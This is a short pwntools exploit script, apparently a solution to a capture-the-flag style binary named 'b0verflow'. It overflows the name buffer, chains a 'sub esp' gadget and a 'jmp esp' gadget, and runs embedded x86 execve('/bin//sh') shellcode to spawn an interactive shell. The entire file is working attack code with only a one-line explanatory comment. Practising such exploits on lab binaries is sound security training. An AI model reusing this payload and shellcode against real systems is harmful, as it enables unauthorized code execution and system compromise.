from pwn import *

target = process('./b0verflow')

target.recvuntil("What's your name?")
jmpEsp = p32(0x8048504)
subEsp = p32(0x8048500)
execBin = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#cause buffer overflow to return to gadget that subtracts stack, then the stack pointer orients to the gadget that jumps the stack, which lets us execute the payload
payload = b""
payload += b"A" * 4 + jmpEsp + execBin  + b"A" * 5 + subEsp

#gdb.attach(target, gdbscript = "b *(vul + 95)")
target.sendline(payload)

target.interactive()
